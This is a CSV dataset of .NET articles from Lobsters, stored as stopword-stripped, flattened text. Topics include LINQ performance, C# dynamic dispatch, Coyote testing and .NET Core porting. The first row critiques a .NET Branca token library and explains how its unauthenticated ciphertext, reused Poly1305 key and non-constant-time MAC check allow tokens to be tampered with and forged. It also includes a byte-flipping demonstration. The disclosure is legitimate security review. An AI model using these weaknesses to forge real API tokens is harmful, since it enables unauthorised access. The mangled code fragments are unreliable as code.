ID,Source,Tag_Code,Tag_Name,Title,Url,ProcessdedTitle,WeightedContent,Content
1,Lobsters,dotnet,"C#, F#, .NET programming",Rolling your own crypto gone wrong: A look at a .NET Branca implementation,https://brycx.github.io/2020/08/22/a-look-at-a-branca-implementation.html,rolling crypto gone wrong look net branca implementation,introduction multiple reason paseto branca made net implementation new scottbradyidentitymodel bouncycastle inspection tokenssecuritytokenexception invalid message authentication code test vector nonce generation systemsecuritycryptographyrandomnumbergeneratorgetbytes unauthenticated ciphertext construction draft rfc rfc ciphertext modified without invalidating token identitymodel allows attacker arbitrarily modify payload branca token pretty clear forgeable token key nacl used identitymodel allows attacker forge api token must xcrypto draft rfc constanttime mac comparison summary found mistake reach,introduction time back looking token authentication format authenticate api call even attempt look jwt co multiple reason landed paseto branca chose branca simplicity needed authenticated api call shared symmetric key branca paseto implemented using paseto also support asymmetric authentication need quite pleased looking straightforward branca made version timestamp nonce ciphertext b tag simply construct header encrypt authenticate payload using header aad back one net implementation targeted net core whereas needed net framework took quick look test vector used instead available github thought may toy project fun dropped forgot fast forward couple day ago returned find new net core implementation also published nuget got hope might polished implementation could get working net framework scottbradyidentitymodel relatively new nuget three release total first release beginning may year latest beginning august us bouncycastle cryptographic implementation offer paseto branca note code discussed based master branch also referring nuget identitymodel throughout rest post inspection tokenssecuritytokenexception invalid message authentication code pulled identitymodel new project took test vector j reference implementation linked specification branca static void testbranca string expectedtoken string expectedpayload var handler new brancatokenhandler var key supersecretkeyyoushouldnotcommit try var actualtoken handlercreatetoken expectedpayload key var actualpayload handlerdecrypttoken expectedtoken key catch exception e consolewriteline failed nexpectedtoken nexpectedpayload nexception n expectedtoken expectedpayload emessage static void main string args testbranca hello world testbranca hello world testbranca hello world running test gave failed expectedtoken expectedpayload hello world exception invalid message authentication code failed expectedtoken expectedpayload hello world exception invalid message authentication code failed expectedtoken expectedpayload hello world exception invalid message authentication code already good start nonce generation starting top file containing branca implementation come createtoken first thing nonce generation var nonce new byte randomnumbergeneratorcreate getbytes nonce us systemsecuritycryptographyrandomnumbergeneratorgetbytes method intended cryptographic purpose check unauthenticated ciphertext nonce generated header created according specification problem come encryption keymaterial new keyparameter key var parameter new parameterswithiv keymaterial nonce var engine new xchachaengine engineinit true parameter familiar bouncycastle checked source see keyparameter parameterswithiv simply wrapper parameter xchachaengine bouncycastle however implemented identitymodel using orgbouncycastlecryptoengines namespace scottbradyidentitymodelcrypto public class xchachaengine chachaengine public xchachaengine base public override string algorithmname protected override int noncesize initializing xchachaengine payload encrypted authenticated var plaintextbytes payload var ciphertext new byte plaintextbyteslength engineprocessbytes plaintextbytes plaintextbyteslength ciphertext var poly new polyinit keymaterial polyblockupdate header headerlength polydofinal ciphertext plaintextbyteslength construction padding aad ciphertext authentication neither authentication length specified draft rfc rfc actually even authenticate ciphertext since dofinal writes current tag ciphertext ciphertext modified without invalidating token var handler new brancatokenhandler var key supersecretkeyyoushouldnotcommit var actualtoken handlercreatetoken test key var decoded actualtoken decoded decodedlength last byte tag consolewriteline handlerdecrypttoken decoded key payload running return tesu instead test thereby identitymodel allows attacker arbitrarily modify payload branca token searching bouncycastle found implementation following field private readonly private readonly imac might noticed engine implemented xchachaengine identitymodel turn identitymodel us variant nonce instead nonce required ietf version require ietf variant taking look chachaengine bouncycastle used calculate subkey nonce length set xchachaengine therefore left original djb using nonce meaning engineinit true parameter load byte nonce generated branca specification make pretty clear encrypt payload encrypt user given payload ietf aead userprovided secret key use header additional data aead made complicated code identitymodel one read draft rfc look another implementation eventually becomes clear combination forgeable token let return attempt authenticating header ciphertext specifically line keymaterial key used initialize xchachaengine sender must use cryptoonetimeauth authenticate one message key authenticator two message key expected reveal enough information allow forgery authenticator message nacl nacls documentation state given key used may used otherwise attacker could forge future authenticator problem since branca might used context like authenticating api call longlived api key used identitymodel allows attacker forge api token would problem identitymodel least used bouncycastle attempt branca implementation us first byte first keystreamblock byte internal state onetime key nonce unique every time used given key must key also unique course identitymodel use branca specification defines also safe randomly generate nonce see xcrypto limitation motivation behind see draft rfc constanttime mac comparison decent implementation compare mac constanttime reveal information via timing sidechannel unfortunately case identitymodel either var headermac new byte headermacsequenceequal tag throw new securitytokenexception invalid message authentication code bouncycastle us constanttime comparison provides comparison function utility arraysconstanttimeareequal macsize mmac mbuf resultlen throw new invalidciphertextexception mac check failed summary big fan rolling crypto talking implementing known algorithm even think making available github similar ask feedback good user warned security expected however problem arises project even uphold bare minimum testing test vector published warning used test vector case left identitymodel completely broken found mistake please reach
2,Lobsters,dotnet,"C#, F#, .NET programming",Domain Modeling Made Functional (2017),https://www.youtube.com/watch?v=Up7LcbGZFuo,domain modeling made functional,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature domain modeling made functional scott wlaschin youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature domain modeling made functional scott wlaschin youtube
3,Lobsters,dotnet,"C#, F#, .NET programming",Best way to create an empty collection (array and list) in C# (.NET),https://www.tabsoverspaces.com/233833-best-way-to-create-an-empty-collection-array-and-list-in-csharp-net,best way create empty collection array list c net,best way create empty collection array list c net array static generic class static field holding empty array specific implementation list code specific implementation summary appendix,best way create empty collection array list c net aug min net net core c one apis working back needed return empty collection performance critical code yet decided would best way exploring learning signature required return list started testing array first expected arrayempty clear winner also interested common way stack array used new testarray ctor new testarray ctorinit arrayempty testarray arrayempty enumerableempty testarray toarray enumerableempty method mean error stddev ratio ratiosd gen gen gen allocated ctor n n n b ctorinit n n n b arrayempty n n n enumerableempty n n n expected arrayempty clear winner make sense return reference static generic class static field holding empty array ctor ctorinit virually different syntax il downside obviously allocation real array caching etc enumerableempty version slowest kind expected surprisingly allocate reason implementation behind emptypartition telement specific toarray implementation arrayempty used way file emptypartition telement called partitionspeedoptcs ok plain old array list actually needed list list different listempty something like similar fashion used new list testlist ctor new list testlist arrayempty testlist tolist arrayempty enumerableempty testlist tolist enumerableempty first two look little bit code execute including branching method mean error stddev ratio ratiosd gen gen gen allocated ctor n n n b n n n b arrayempty n n n b enumerableempty n n n b matter approach allocate allocate amount list turn contains array int field surprisingly ctor compared half expecting much difference learning new enumerableempty next relying emptypartition telement specific tolist implementation turn call ctor finally arrayempty slowest specific optimization case summary fastest way get empty array using arrayempty call list using new list aka straightforward way crazy idea appendix execution done environment oswindows intel core cpu kaby lake cpu logical physical core net core host net core coreclr corefx ryujit defaultjob net core coreclr corefx ryujit
4,Lobsters,dotnet,"C#, F#, .NET programming",Optimising LINQ,https://mattwarren.org/2016/09/29/Optimising-LINQ/,optimising linq,optimising linq problem linq joe duffy hidden allocation premature optimization evil myth jon skeet beauty closure heap allocation viewer aside roslyn based heap allocation analyser pointing optimised single iterator used one iterator needed note microoptimisations one talk profile benchmark coding guideline avoid linq essential truth everyone know performance large managed codebase hot path critical famous donald knuth quote yet pas opportunity critical roslynlinqrewrite linqoptimizer roslynlinqrewrite nessos linqoptimizer performance compile runtime comparison linq support linq query expression roslynlinqrewrite linqoptimiser total performance result benchmark code linqoptimiser lot backing storage roslynlinqrewrite benchmark code future option roslynlinqrewrite linqoptimiser qcon new york talk work already started rprogramming reading,optimising linq sep word problem linq outlined joe duffy linq introduces inefficiency form hidden allocation premature optimization evil myth take example technology quite supportive make writing inefficient code easy let look linqtoobjects quick many inefficiency introduced code int scale int input int lo int hi int c var result x input x lo x hi select x c return resultstoarray good question know probably jon skeet tell looking code fully understand problem need take look compiler u behindthescenes code end looking something like private int scale int input int lo int hi int c c c new c lo c hi c c return input int new func int bool c scale select int int new func int int c scale toarray int compilergenerated private sealed class public int c public int hi public int lo internal bool scale int x return x thislo x thishi internal int scale int x return x thisc see extra class allocated func perform actual logic even account overhead toarray call using iterators calling linq method via dynamic dispatch aside interested finding closure worth reading jon skeet excellent blog post beauty closure lot going behind scene actually possible shown hidden allocation directly visual studio install excellent heap allocation viewer plugin resharper get following tooltip right ide useful though recommend turning time seeing red line code tends make bit paranoid aside resharper roslyn based heap allocation analyser available provides similar functionality look way reduce impact linq worth pointing linq pretty neat trick ht oren novotny pointing instance common pattern followed select optimised single iterator used two would expect likewise two select statement row combined one iterator needed note microoptimisations whenever write post like inevitably get comment complaining premature optimisation something similar time want add following caveat way advocating linq bad thing think fantastic feature c language also please rewrite code based purely result microbenchmarks explain one talk always profile first benchmark way round temptation optimise needed said c compiler roslyn coding guideline actually state following avoid allocation compiler hot path avoid linq avoid using foreach collection struct enumerator consider using object pool many usage object pool compiler see example slightly ironic considering advice come people conceived designed linq first place outlined excellent talk essential truth everyone know performance large managed codebase found linq noticeable cost note hot path another way talking critical famous donald knuth quote forget small efficiency say time premature optimization root evil yet pas opportunity critical roslynlinqrewrite linqoptimizer clearly could manually rewrite linq statement iterative version concerned performance much nicer tool could hard work u well turn first roslynlinqrewrite per project page tool compiles c code first rewriting syntax tree linq expression using plain procedural code minimizing allocation dynamic dispatch also available nessos linqoptimizer automatic query optimizercompiler sequential parallel linq linqoptimizer compiles declarative linq query fast loopbased imperative code compiled code fewer virtual call heap allocation better data locality speedup check performance page highlevel main difference roslynlinqrewrite work compile time prevents incremental compilation project code change except want opt via nolinqrewrite linqoptimiser work runtime force add asqueryexpr run linq method optimises parallel linq rest post look tool detail analyse performance comparison linq support obviously choosing either tool want sure actually going optimise linq statement code base however neither tool support whole range available linq query expression chart illustrates method roslynlinqrewrite linqoptimiser select yes yes tolist yes toarray yes count yes foreach yes reverse cast oftype firstfirstordefault singlesingleordefault lastlastordefault todictionary longcount elementatelementatordefault contains aggregate sum selectmany taketakewhile skipskipwhile groupby orderbyorderbydescending thenbythenbydescending total performance result finally get main point blog post different tool perform achieve stated goal optimising linq query reducing allocation let start common scenario using linq filter map sequence number ie c var result itemswhere select compare linq code optimised version plus iterative form serve baseline result full benchmark code first thing jump linqoptimiser version allocating lot memory compared others see happening need look code generates look something like ienumerable int linqoptimizer int input var collector new nessoslinqoptimizercorearraycollector int int counter counter inputlength counter var input counter var result collectoradd result return collector issue default arraycollector allocates int backing storage hence excessive allocation contrast roslynlinqrewrite optimises code like ienumerable int int linqitems linqitems null throw new systemargumentnullexception int index index linqitemslength index var linqitem linqitems index linqitem var linqitem yield return much sensible using yield keyword get compiler hard work allocate temporary list store result mean streaming value way original linq code lastly look one example time using count expression ie itemswhere count clearly see tool significantly reduce allocation compared original linq code full benchmark code future option however even though using roslynlinqrewrite linqoptimiser pretty painless still install party library project even nicer net compiler jitter andor runtime optimisation u well certainly possible joe duffy explains qcon new york talk work already started maybe wait long discus post rprogramming reading
5,Lobsters,dotnet,"C#, F#, .NET programming",Visitor and multiple dispatch via C# 'dynamic' (2011),https://www.shawnhargreaves.com/blog/visitor-and-multiple-dispatch-via-c-dynamic.html,visitor multiple dispatch via c dynamic,visitor multiple dispatch via c dynamic design pattern emulate missing language feature series article exploring visitor pattern multiple dispatch dynamic,ï visitor multiple dispatch via c dynamic somewhat convincing argument software design pattern really attempt emulate missing language feature eric lippert recently wrote series article exploring one might attempt implement virtual method pattern already built c interesting see thing work behind scene would course crazy actually hand language already provides convenient virtual keyword ah codification convenience wherein cheerfully constrain choice order conceal complexity virtual method allow u dynamically choose code execute depending type object dealing ubiquitous modern object oriented language easy forget missing couple sometimes important feature want run code member function type question perhaps nt type modify maybe nt make sense implement code member problem visitor pattern designed solve never seen visitor implementation nt strike ugly overly complex want choose code based type one object feature called multiple dispatch lisp programming language directly support c rescue dynamic keyword added c designed simplify interop statically typed c dynamically typed language com component deferring method resolution compile time runtime dynamically applying overload selection logic c compiler would normally use compile time interestingly exactly need implement multiple dispatch virtual dispatch non instance method aka visitor pattern consider simple class hierarchy class animal class cat animal class dog animal class mouse animal create several overload method specialized according different combination parameter type void reactspecialization animal animal consolewriteline interested void reactspecialization cat dog consolewriteline cat run away dog void reactspecialization cat mouse consolewriteline cat chase mouse void reactspecialization dog cat consolewriteline dog chase cat magic part void react animal animal reactspecialization dynamic dynamic work dynamic cast tell c compiler rather calling reactspecialization animal animal dynamically examine type parameter make runtime choice method overload invoke prove really work void test animal cat new cat animal dog new dog animal mouse new mouse react cat dog react cat mouse react dog cat react dog mouse output cat run away dog cat chase mouse dog chase cat dog interested mouse note especially last dog mouse call provide specialized method parameter type automatically fell back closest matching alternative case animal animal overload suitable fallback overload would raised runtime exception instead course dynamic invoke free probably nt something want rely core game loop used technique heavily build time processing tool plenty fast enough even show profiler vastly simplified would otherwise complex type dispatch logic
6,Lobsters,dotnet,"C#, F#, .NET programming",Extreme programming meets systematic testing using Coyote,https://cloudblogs.microsoft.com/opensource/2020/07/14/extreme-programming-meets-systematic-testing-using-coyote/,extreme programming meet systematic testing using coyote,annals wiki challenge coyote producerconsumer queue challenge wiki page heisenbug coyote synchronizedblock explaining bug lesson complete code article,world increasingly reliant cloud service expected high availability handle high throughput minimal latency service also expected resilient reliable presence internal external failure maintaining high quality bar presence continuous evolution change tall task bug fall crack despite rigorous testing good intention running unit test integration test every checkin standard industry practice even stress test service ensure reliability performance subtle bug still slip important realize source complexity chance taming service inherently concurrent nature rest apis called concurrently must prepared handle interleaving call often distributed across fleet machine make dealing concurrency challenging readily use primitive like lock semaphore writing correct concurrent code always hard combinatorics state space say exponential desperately need new tool arsenal help u tame complexity coyote one tool article highlight coyote capability applying delightfully interesting example annals wiki tom cargill posed challenge extreme programming community saying concurrent program hard test combinatorial explosion state space must covered state space explodes arbitrary context switching scheduler general impossible use external input force program state must covered conventional test harness mechanism influencing scheduler well turn exactly coyote designed solve let walk coyote easily solve programming problem posed tom cargill shared boundedbuffer implementation written java known tricky deadlock bug coyote work net following c version example using net systemthreadingmonitor contains bug using systemthreading class boundedbuffer public void put object x lock thissyncobject thisoccupied thisbufferlength monitorwait thissyncobject thisoccupied thisputat thisbufferlength thisbuffer thisputat x monitorpulse thissyncobject public object take object result null lock thissyncobject thisoccupied monitorwait thissyncobject thistakeat thisbufferlength result thisbuffer thistakeat monitorpulse thissyncobject return result private readonly object syncobject new object private readonly object buffer new object private int putat private int takeat private int occupied boundedbuffer implement buffer fixed length concurrent writer adding item buffer reader consuming item buffer reader wait item buffer writer wait buffer full resuming slot consumed reader also known producerconsumer queue concrete ask community find particular bug cargill knew program metaask come methodology catching bug rapidly point worthwhile take moment reason program see spot bug might also helpful read discussion challenge wiki page spot bug difficulty seeing bug alone almost one wiki thread able spot bug rigorous testing jvm reliably reproduce bug either lead skepticism bug implementation tricky bug find add kind console debugging statement debug bug go away classic heisenbug decided apply coyote challenge coyote systematically control explores concurrency nondeterminism encoded program perfect fit challenge like coyote provides dropin replacement systemthreadingmonitor called synchronizedblock allows coyote precisely control concurrency program systematically explore possibility following implementation boundedbuffer implementation using coyote public class boundedbuffer public boundedbuffer int buffersize thisbuffer new object buffersize public void put object x using var monitor synchronizedblocklock thissyncobject thisoccupied thisbufferlength monitorwait thisoccupied thisputat thisbufferlength thisbuffer thisputat x monitorpulse public object take object result null using var monitor synchronizedblocklock thissyncobject thisoccupied monitorwait thistakeat thisbufferlength result thisbuffer thistakeat monitorpulse return result private readonly object syncobject new object private readonly object buffer private int putat private int takeat private int occupied straightforward translation original code c leveraging coyote synchronizedblock write small test driver program coyote use find bug first test write might look like microsoftcoyotesystematictestingtest public static void testboundedbuffertrivial icoyoteruntime runtime boundedbuffer buffer new boundedbuffer var task new list task taskrun reader buffer taskrun writer buffer taskwaitall taskstoarray setup two task first reader calling take writer calling put following implementation test reader writer method private static void reader boundedbuffer buffer int iteration int iteration object x buffertake private static void writer boundedbuffer buffer int iteration int iteration bufferput hello clearly put number item take otherwise trivial deadlock waiting item matched test iteration put take find deadlock run test despite coyote systematically exploring different possible interleavings put take call bug might bit challenging find let think second following variable play buffer size number concurrent reader number concurrent writer number iteration inside task bug might trigger certain configuration configuration use coyote explore state space configuration luckily generate random number reader writer buffer length iteration letting coyote explore configuration coyote also explore task interleavings configuration following slightly interesting coyote test explores configuration letting coyote control nondeterminism introduced random variable scheduling resulting number task microsoftcoyotesystematictestingtest public static void testboundedbufferfinddeadlockconfiguration icoyoteruntime runtime var random microsoftcoyoterandomgeneratorcreate int buffersize randomnextinteger int reader randomnextinteger int writer randomnextinteger int iteration randomnextinteger int totaliterations iteration reader int writeriterations totaliterations writer int remainder totaliterations writer runtimeloggerwriteline testing buffer size reader writer iteration buffersize reader writer iteration boundedbuffer buffer new boundedbuffer buffersize runtime var task new list task int reader tasksadd taskrun reader buffer iteration int x int writer int w writeriterations writer w remainder x w tasksadd taskrun writer buffer w taskwaitall taskstoarray test using coyote test tool see coyote find magic test configuration creates deadlock coyote test boundedbufferdll iteration boundedbufferexampleprogramtestboundedbufferfinddeadlockconfiguration output following starting testingprocessscheduler process created testing task task using random strategy iteration iteration iteration iteration iteration iteration iteration iteration iteration iteration iteration task found bug emitting task trace writing writing elapsed sec testing statistic found bug scheduling statistic explored schedule fair unfair found buggy schedule number scheduling point fair terminating schedule min avg max elapsed sec done see coyote found bug quickly second found bug iteration log file contains telltale message deadlock detected task waiting task complete controlled task enabled task task task task task task task task task task waiting acquire resource already acquired controlled task enabled also see log writeline show u configuration failed testing buffer size see took total nine concurrent task five reader four writer buffer size one generate deadlock take deeper look deadlock let see smaller configuration also reproduce bug help find minimal test coyote test handy option called tell coyote keep testing given iteration report bug found like coyote test boundedbufferdll iteration explore verbose boundedbufferexampleprogramtestboundedbufferfinddeadlockconfiguration logtxt coyote found test configuration failed want minimal test filter logtxt file print configuration one writer result testing buffer size testing buffer size testing buffer size testing buffer size testing buffer size testing buffer size testing buffer size testing buffer size testing buffer size testing buffer size testing buffer size indeed see clearly minimal test two reader one writer also see deadlock found buffer size one small number iteration write minimal test use iteration sure deadlock often microsoftcoyotesystematictestingtest public static void testboundedbufferminimaldeadlock icoyoteruntime runtime boundedbuffer buffer new boundedbuffer var task new list task taskrun reader buffer taskrun reader buffer taskrun writer buffer taskwaitall taskstoarray run outside coyote deadlock almost every time expected add consolewritelines inside boundedbuffer implementation deadlock longer occurs due heisenbug nature consolewriteline somehow change timing enough deadlock longer occurs test new method using coyote test using boundedbufferexampleprogramtestboundedbufferminimaldeadlock fortunately coyote also produce another log file called magic file coyote use replay bug using coyote replay boundedbufferdll boundedbufferexampleprogramtestboundedbufferminimaldeadlock step program debugger take long want bug always found huge advantage anyone debugging kind heisenbugs explaining bug coyote found bug dive explore really happening added detailed logging take put method replayed buggy trace using coyote replay feature ended following graph horizontal axis represents time vertical axis represents various step inside take put method take put method similar structure share vertical axis program start two reader task attempting take item buffer buffer empty point go wait state woken pulse signal sole writer task start next put item buffer sends pulse signal awakens first task entered wait queue reader task start running however writer task able reacquire lock start second run happen due nondeterminism operating system thread scheduling crucial step creating bug buffer already full writer task go wait state reader finally get chance run consumes item buffer sends pulse signal wake next task wait queue since reader head queue run next immediately block buffer still empty point writer task reader task blocked reader task run go wait state buffer empty point three task waiting state application deadlocked deadlock requires numerous iteration reader writer random scheduling decision operating system order occur difficult foresee reliably reproduce given understanding also get hint right fix one fix use pulseall wake every indeed work another perhaps efficient fix send pulse right calling wait way reader task sends another pulse wake writer task thing could proceed also test fix using coyote full testboundedbufferfindconfiguration test function make sure find another pesky test configuration lesson coyote able help u quickly find way trigger subtle race condition lead deadlock boiled simplest possible reproducible trace making test smaller made easier find bug counter intuitive developer traditionally stress test application large number request trigger race condition might still able reliably reproduce coyote hand systematically explores state space reliably reproduce bug much smaller test fact efficiency coyote finding bug increase test get smaller bug implementation obvious fact author spend time poring coyote reproducible trace finally grokking bug speaks effectiveness tool like coyote inability human always foresee subtle race condition like boundedbuffer implementation may seem academic important generalize lesson exercise see apply production service production service contain way two method put take example expose number rest apis called highly concurrent manner operate shared resource like underlying buffer example distributed service always use concurrency control mechanism like lock coordinating work across independent backend service use distributed transaction coordinate data say two independent partition scalable keyvalue store like cosmosdb furthermore individual node distributed service crash point time developer must gracefully deal failure possible step dealing external state constantly evolving changing hard problem appreciating complexity size state space first step towards building reliable software service tool like coyote help team tame combinatorial complexity systematically exploring state space catch safety liveness violation every checkin allow get best world extreme programming without sacrificing quality tool magically find bug best tool one work developer enabling follow intuition helping design efficient maintainable test service think coyote indeed one tool complete code article available github question feedback please let u know comment
7,Lobsters,dotnet,"C#, F#, .NET programming",Modernising .NET projects for .NET Core and beyond,https://dwmkerr.com/modernising-dotnet-projects/,modernising net project net core beyond,net core net framework net core future net framework read net framework read c net core satya nadella read net core divergence net standard net standard convergence net net challenge modernisation compatibility modernisation process introducing two villain sharpgl opengl sharpshell step understand domain net framework net core porting guide step understand goal multiplatform build step migrate project leafwise porting guide porting guide step refactor rinse repeat target framework sdkstyle project step update build step simplify pull request sharpshell pull request step test test test step document compatibility key learning consumer experience developer experience maintainer experience useful reference,world net going transformation net framework reaching end life net core increasingly feature rich robust platform develop solution target linux macos embedded device container also net standardbut mean net framework project article describe modernise net framework project net core net standard net planned released year also explain high level difference platform consequence upgrading consumer developer maintainersthe net framework net core futurethere lot written topic still little overwhelming understand thing fit togetherhere simple visual created try put thing context going cover bare essential link reading topic want go deeper article mainly going focused practicality consequence migration retargetingfirst net frameworkthe net framework created set unified tool standard allow developer microsoft platform quickly build solution provide interoperability language read net frameworkthe net framework rapidly gained popularity partly due convenience developing c rather basic cc c provided developer friendly language c c many use case heavily inspired java read c increase popularity net framework started frequent release became standard part window operating system installed box rather ondemand neededhowever net framework functioned microsoft window greatly limited potential us case even engineer used web client application mobileenter net coremicrosoft signaled radical switch strategy appointment satya nadella becoming increasingly focused open source importantly deciding microsoft development toolchain force user use window execution environmentnet core developed lightweight version net framework could run multiple platform including linux macos read net corein short period time net core became feature rich providing lot capability web developer frontend application developersthe challenge divergence net standardas net core became feature rich api became closer net framework still fundamentally different runtimes binary compiled net core run net framework viceversato deal issue microsoft developed net standard specification set apis runtime offered apis solution built runtime meet standard could run compliant platformwhat mean basically table show consequence build net core example also run net framework mono unity runtimes implement net standard course feature always going platform specific standard started small grown timemoving convergence netgiven later version net framework net core actually follow standard platform actually starting become similarthey becoming similar longer make sense maintain separately next major version platform net new runtime next version net core net frameworkthis mean net framework net core going converge single platform wonderful developer simplify complex landscapebut mean net framework project modernise make tradeoff around compatibility challenge modernisation compatibilityi number project target net framework project multiple request migrate net core hold work could really understand detail thing would mean consumer library would change platform use could break thing would mean developer platform would need change development environment would cause problem would mean maintainer library would greatly increase build deployment complexity finally found time able start address issue detail hopefully learning useful anyone maintaining net codebase thinking futurethe modernisation process introducing two villainsthere two key project wanted modernise reasonably well used complex potentially serious complexity multiplatform buildssharpgl library allows developer use opengl net application big challenge opengl cross platform sharpgl specifically provides interface window version opengl possibly made futureproof could ever target platform sharpshell library allows developer build shell extension window shell extension customisations window user interface would portable across platform still want ensure project future proofwhat would experience two project net project far le popular much simple instinct work process project others straightforwardthese step followed modernise finish article summary key learningsstep understand domaini stress enough meaningful technology work understand domain dealing quick google migrate following formal migration guide enough knew actually understand reasonably detailed level difference runtime tradeoff process complexitythis article result work sometimes writing topic best way force learn itmaking change rapidly waiting see consequence often work small project internal tool library relied upon others good community last thing wanted make change unintended consequence user making sure learnt space thing work hood expected change future criticalhopefully others process understanding domain little easier article cover high level topic actual process writing migrating went lot deeper article goesthe key document follow actually execute migration excellent official net framework net core porting guidestep understand goal multiplatform buildsgiven understanding domain made much easier understand required step would essentially would needed would target version net framework adheres recent version net standard done theory project could built net framework net core also ready upcoming net releasemultiplatform build supported visual studio build allow u single codebase build library multiple platform ie net framework net core resulting binary packed single package consumer install package appropriate library installedthis introduces first significant consequence modernising project mean must migrate visual studio past might issue license visual studio expensive many organisation locked onto specific version compatibility issue slow upgrade seems case le often nowadays still important considerationmy project using visual studio project property looked unsurprisingly net standard nt mentioned time upgrade installed could reminisce excitement buying visual c net learning edition try remember like year old wonder box set still kicking around somewhere want see much changed long install process visual studio nt least kept installing remember enable net core featuresstep migrate project leafwise per porting guide need migrate project make solution starting leaf project nt depend project moving tree root project project depended others visually solution like sharpgl would mean project need converted following order expecting project quite different experience sharpglserialization set class load data file theory library become completely portablesharpglwpf sharpglwinforms specifically window frontend technology expected able ported nt expect work platform future might sharpglosx sharpglgnome know sharpglscenegraph set class represent scene thing like light camera material expect work thing like image loading perhaps need tweakingsharpgl wrapper around window library ca nt imagine working anywhere window would project structure porting go would build detail migrate project porting guide general approach attempt convert latest project format tryconvert toolretarget project net framework first version support net standard repeat project project depends walking tree project rootrun portability analysis tool see apis available certain platformsthis project might look migration run tryconvert need edit project file change line targetframework targetframework targetframeworks targetframeworks target choose depend apis want use portability analysis extension available build portability report one look like also show specific apis compatible specific target time move next stepstep refactor rinse repeatthis tricky part need work whether want remove api call portable try use alternative conditionally compile code different platformsif using nonportable apis may need use conditional block execute different code depending framework used target framework sdkstyle project guide show thisyou may also manually edit project file ensure certain dependency used certain target solution file dependency may end looking something like reloaded project see dependency specified perframework basis build generates assembly target process might simple complex depending nuance project fairly iterative starting targeting original target framework used adding targetssome target simply possible example net core support winforms wpf net core onwards wo nt able build winforms wpf assembly target lower version framework nt support itstep update buildsat stage fixed compatibility issue code build visual studionow would recommend porting build code use dotnet build system going maximise portability futureproof project able run build multiple platform using preferred standard tool msbuild essentially become legacy way like structure thing personally set script run build test package code locally call script ci tool choice automate thing still keep logic code rather hidden away build systemfor example sharpgl project following script machine run build installing necessary component nunit need run test including coverage report report written sharpgl nuget package copied artifactspackagesi updated script use dotnet tool example build script look something like run build hiding documentation warning pinvoke code buildcommand dotnet msbuild psscriptrootsharpglsln nowarn nowarn rebuild p configurationrelease writehost running buildcommand invokeexpression buildcommand pack script look like dotnet pack norestore nobuild psscriptrootcoresharpglsharpglcsproj c release dotnet pack norestore nobuild psscriptrootcoresharpglscenegraphsharpglscenegraphcsproj c release dotnet pack norestore nobuild psscriptrootcoresharpglserializationsharpglserializationcsproj c release dotnet pack norestore nobuild psscriptrootcoresharpglwinformssharpglwinformscsproj c release dotnet pack norestore nobuild psscriptrootcoresharpglwpfsharpglwpfcsproj c release actual script little complex key thing run part cicd process locally test debug cicd platformyou likely conditionally reference certain component dependency might different see many project file code like itemgroup reference include systemdesign condition targetframework reference include systemdesign condition targetframework reference include systemdesign condition targetframework reference include systemwindowsforms condition targetframework reference include systemwindowsforms condition targetframework reference include systemwindowsforms condition targetframework itemgroup itemgroup packagereference include microsoftcsharp version condition targetframework packagereference include microsoftcsharp version condition targetframework packagereference include microsoftcsharp version condition targetframework packagereference include microsoftcsharp version condition targetframework packagereference include systemdatadatasetextensions version condition targetframework packagereference include systemdatadatasetextensions version condition targetframework packagereference include systemdatadatasetextensions version condition targetframework packagereference include systemdatadatasetextensions version condition targetframework itemgroup case quite bit trial error needed find appropriate reference platformstep simplify one benefit found process simplify project longer need kind automated nuget restore functionality mean remove code like project file import project solutiondir nugetnugettargets condition exists solutiondir nugetnugettargets target name ensurenugetpackagebuildimports beforetargets prepareforbuild propertygroup errortext project reference nuget package missing computer use nuget package restore download information see http gomicrosoftcomfwlink missing file errortext propertygroup error condition exists text systemstring format errortext error condition exists text systemstring format errortext target also remove projectjson data csproj fileanother nice update longer need maintain assemblyinfocs file keep assembly metadata csproj filefinally almost certainly remove nuspec file nuget packaging data also embedded csproj file example sharpshell project metadata look like project sdk microsoftnetsdkwindowsdesktop propertygroup targetframeworks targetframeworks outputtype library outputtype following properies used manage project packaged packageid sharpshell packageid copyright copyright c dave kerr copyright packageprojecturl http githubcomdwmkerrsharpshell packageprojecturl repositoryurl http githubcomdwmkerrsharpshell repositoryurl version version author dave kerr author company dave kerr company packagetags shell sharpshell com context menu icon handler packagetags description sharpshell framework let build window shell extension using net core net framework description propertygroup snip project help keep lot project dependency property data one place probably convenient many usersyou see pull request sharpgl see project file updated case also see sharpshell pull request sharpshell version still work progress time writingstep test test testnow fun part going really test new package platform sadly kind migration something issue exposed via unit test need create test project import package ideally platform make sure work could runtime error particularly made mistake referencesmany issue caught compile time nothere screenshot fun trying net framework package winforms net core package wpf test package dependent building highly platform specific likely lot testing fairly selfcontained code might able get away basic smoke testingstep document compatibilityif supporting multiple platform framework going lot help consumer code clear supportedthis may complex think library may run fine part net core console application window work macos linux screenshot would never imagined started sharpgl project terminal application running macos using sharpglserialization library load geometry file course something like sharpgl run mac linux lot work would needed sharpgl core nothing wrapper around window platform dlls opengl still available support possible ready yet stage docmenting know work well nt really helpfulyou might also want preserve premigration code separate branch case user reason issue migrating need use older version sharpgl updated project page indicate compatibility tested key learningshere key learning stood worked migration projectsconsumer experienceif careful nt break anything consumer multitargeting still target older frameworksyou potentially greatly increase compatibility project offering support net coredeveloper experienceyou need upgrade visual studio mldr mldr however use visual studio mac even commandline build across many platformsmaintainer experienceyou much larger set potential consumer likely find bug framework platform specificyou likely need work migrating project file use latest dotnet toolingyou careful document known compatibility issuesall process le painful expected work done focus exciting thing potentially getting project like sharpgl working linux macos much excitingas always question comment suggestion rant anything welcome pull request migrates sharpgl project sharpshell project useful reference
8,Lobsters,dotnet,"C#, F#, .NET programming",Nodexr: A node-based Regular Expression editor,https://github.com/jcparkyn/nodexr/,nodexr nodebased regular expression editor,nodexr nodexr published feature use node replacement contributing issue also check regex node,nodexr nodexr nodebased regular expression editor created c blazor nodexr published also try starting one example expression screenshot show regular expression used match floating point number without exponent feature us full net regex engine search replace unlike online regex tool show result search replace using net regex engine browser realtime full syntax highlighting hover section output see node generated node used work almost net regex spec additional functionality implemented either using text node without escaping custom group node nodebased approach make almost impossible syntax error missing parenthesis etc except certain node enter existing regex parsed fully editable node tree using edit button next output work expression complexity level although couple niche feature ca nt yet parsed properly create shareable link expression send someone else come back later feature currently relies expression parsing case node tree little different sharing expression information node found clicking button next title automatically deal noncapturing group longer think case run completely clientside communication server initial page load use draganddrop node left panel insert main window final resultoutput node must connected output node displayed top left main concept nesting behaviour regex expressed connecting one node input another item sequence connected using previous 